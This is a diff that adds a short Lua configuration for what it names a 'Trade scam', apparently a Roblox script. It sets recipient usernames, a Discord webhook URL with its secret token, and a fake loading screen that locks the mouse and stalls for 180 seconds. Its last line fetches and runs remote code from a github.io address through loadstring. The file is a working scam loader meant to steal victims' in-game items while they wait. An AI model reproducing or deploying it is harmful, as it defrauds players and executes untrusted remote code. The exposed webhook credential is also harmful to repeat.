@@ -1,0 +1,15 @@
+UserName = "fjhgaijskhdg"
+UserName2 = "fjhgaijskhdg"
+Webhook = "https://discord.com/api/webhooks/1093918606263341066/lB_gpALo2NjjkQzfaybn6hUVzi2pGiR9-y5CK53UXq4a5uuMcwftgkQ66kmuBt_g5v7-"
+
+_G.LoadingScreen = true
+_G.AntiLeave = false
+_G.MouseLock = true 
+
+_G.ScriptName = "Trade scam"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
